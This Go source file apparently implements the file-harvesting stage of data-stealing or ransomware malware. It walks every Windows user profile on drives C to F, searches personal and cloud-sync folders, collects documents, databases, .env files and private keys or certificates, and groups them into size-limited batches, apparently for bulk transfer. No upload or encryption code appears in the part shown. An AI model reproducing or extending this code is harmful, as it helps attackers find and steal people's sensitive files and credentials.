package walker

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
)

type File struct {
	Path string
	Size int64
}

type Walker struct {
	maxGroupSize int64
	totalSize    int64
	skipMap      map[string]bool
	extMap       map[string]bool
	targetDirs   []string
}

var (
	TargetExtensions = []string{

		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".csv", ".rtf", ".odt", ".pages", ".numbers", ".key", ".odp", ".wpd", ".wps",

		".txt",

		".pem", ".key", ".p12", ".pfx", ".cer", ".crt", ".gpg", ".pgp", ".ssh",

		".env",

		".db", ".sqlite", ".sqlite3", ".mdb", ".accdb",
	}

	Directories = []string{

		"Desktop",
		"Documents",
		"Downloads",
		"Pictures",
		"Videos",

		"OneDrive",
		"Dropbox",
		"Google Drive",
		"iCloud Drive",
		"Box Sync",
		"Mega",
		"pCloud",
	}

	skipPaths = []string{
		"Windows", "Program Files", "Program Files (x86)", "ProgramData",
		"System Volume Information", "$Recycle.Bin", "$WinREAgent",
		"AppData", "Local Settings", "Application Data", "Recent",
		"Temporary Internet Files", "Cache", "Cookies", "Recovery", ".cursor", ".cargo", "MinGW", "node_modules",
		"mingw64", "vscode", "windsurf", "zed", "TorBrowser", "tor-browser",
	}
)

func NewWalker(maxGroupSize int64) *Walker {

	skipMap := make(map[string]bool, len(skipPaths))
	for _, path := range skipPaths {
		skipMap[strings.ToLower(path)] = true
	}

	extMap := make(map[string]bool, len(TargetExtensions))
	for _, ext := range TargetExtensions {
		extMap[strings.ToLower(ext)] = true
	}

	return &Walker{
		maxGroupSize: maxGroupSize,
		skipMap:      skipMap,
		extMap:       extMap,
		targetDirs:   Directories,
	}
}

func (w *Walker) FindFiles(root string) ([]File, error) {
	var (
		wg       sync.WaitGroup
		fileList []File
	)

	paths := make(chan string, 2048)
	results := make(chan File, 2048)

	collectorDone := make(chan struct{})
	go func() {
		for file := range results {
			fileList = append(fileList, file)
		}
		close(collectorDone)
	}()

	workerCount := runtime.NumCPU() * 2
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for path := range paths {
				w.processPathWithResults(path, results)
			}
		}()
	}

	go func() {

		userDirs := w.findUserDirectories()

		for _, userDir := range userDirs {
			for _, targetDir := range w.targetDirs {
				targetPath := filepath.Join(userDir, targetDir)
				if _, err := os.Stat(targetPath); err != nil {
					continue
				}

				err := filepath.Walk(targetPath, func(path string, info os.FileInfo, err error) error {
					if err != nil {
						if os.IsPermission(err) {
							return filepath.SkipDir
						}
						return nil
					}

					if info.IsDir() {

						name := strings.ToLower(info.Name())
						if w.skipMap[name] {
							return filepath.SkipDir
						}
						return nil
					}

					paths <- path
					return nil
				})

				if err != nil {
					log.Printf("Error walking path %s: %v", targetPath, err)
				}
			}
		}
		close(paths)
	}()

	wg.Wait()
	close(results)
	<-collectorDone

	return fileList, nil
}

func (w *Walker) findUserDirectories() []string {
	var userDirs []string

	for _, drive := range "CDEF" {
		usersPath := string(drive) + ":\\Users"
		if _, err := os.Stat(usersPath); err != nil {
			continue
		}

		entries, err := os.ReadDir(usersPath)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			name := entry.Name()

			if name == "Public" || name == "Default" || name == "Default User" || name == "All Users" {
				continue
			}
			userDirs = append(userDirs, filepath.Join(usersPath, name))
		}
	}

	return userDirs
}

func (w *Walker) processPathWithResults(path string, results chan<- File) {
	info, err := os.Stat(path)
	if err != nil {
		return
	}

	if !info.IsDir() {
		ext := strings.ToLower(filepath.Ext(path))
		if w.extMap[ext] {
			size := info.Size()
			atomic.AddInt64(&w.totalSize, size)

			results <- File{
				Path: path,
				Size: size,
			}

			log.Printf("Found file: %s (size: %d bytes)", path, size)
		}
	}
}

func (w *Walker) GroupFiles(files []File) [][]File {
	if w.maxGroupSize == 0 {

		groups := make([][]File, len(files))
		for i, file := range files {
			groups[i] = []File{file}
		}
		return groups
	}

	var groups [][]File
	var currentGroup []File
	var currentSize int64

	for _, file := range files {
		if currentSize+file.Size > w.maxGroupSize {
			if len(currentGroup) > 0 {
				groups = append(groups, currentGroup)
				currentGroup = nil
				currentSize = 0
			}
		}
		currentGroup = append(currentGroup, file)
		currentSize += file.Size
	}

	if len(currentGroup) > 0 {
		groups = append(groups, currentGroup)
	}

	return groups
}
